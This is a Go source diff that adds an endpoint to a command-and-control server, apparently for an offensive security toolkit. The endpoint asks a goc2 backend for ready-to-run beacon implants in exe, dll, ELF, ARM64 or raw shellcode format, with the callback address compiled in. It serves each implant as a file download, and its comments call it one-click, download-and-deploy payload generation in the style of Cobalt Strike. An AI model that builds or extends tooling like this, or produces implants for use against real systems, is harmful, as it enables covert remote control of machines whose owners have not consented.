@@ -10,6 +10,7 @@ package server
 
 import (
 	"encoding/json"
+	"fmt"
 	"net/http"
 	"net/url"
 	"strings"
@@ -97,6 +98,54 @@ func (s *Server) c2ListenersAPI(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	writeJSON(w, 200, map[string]any{"data": listeners})
+}
+
+// c2PayloadFormats 支持的载荷格式 → 文件扩展（与 goc2 /generate 对齐）。
+var c2PayloadFormats = map[string]string{
+	"amd64_exe": "exe", "x86_exe": "exe", "amd64_exe_g": "exe",
+	"amd64_dll": "dll", "linux_elf": "bin", "linux_elf_g": "bin",
+	"linux_arm64": "bin", "shellcode": "bin",
+}
+
+// POST /api/tools/c2/generate — CS/vshell 风格一键载荷：真实 beacon 二进制，
+// 连接参数编译时内嵌，下载即部署（不再只出配置 JSON 让用户自己编译）。
+func (s *Server) c2GenerateAPI(w http.ResponseWriter, r *http.Request) {
+	var b struct {
+		ListenerID string `json:"listener_id"`
+		Format     string `json:"format"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
+		writeErr(w, 400, "bad json: "+err.Error())
+		return
+	}
+	if strings.TrimSpace(b.ListenerID) == "" {
+		writeErr(w, 400, "listener_id 必填")
+		return
+	}
+	ext, ok := c2PayloadFormats[b.Format]
+	if !ok {
+		writeErr(w, 400, "format 非法（支持 amd64_exe/x86_exe/amd64_exe_g/amd64_dll/linux_elf/linux_elf_g/linux_arm64/shellcode）")
+		return
+	}
+	raw, meta, err := c2Client().GeneratePayload(r.Context(), b.ListenerID, b.Format)
+	if err != nil {
+		writeErr(w, 502, "goc2 生成失败: "+err.Error())
+		return
+	}
+	name, _ := meta["filename"].(string)
+	if name == "" {
+		short := strings.TrimPrefix(b.ListenerID, "ls_")
+		if len(short) > 8 {
+			short = short[:8]
+		}
+		name = "agent_" + short + "." + ext
+	}
+	if srv, _ := meta["server"].(string); srv != "" {
+		w.Header().Set("X-Agent-Server", srv) // 前端展示内嵌回连地址
+	}
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, name))
+	_, _ = w.Write(raw)
 }
 
 // PUT /api/tools/c2/clients/{id}/notes — 会话备注（CS 备注）。
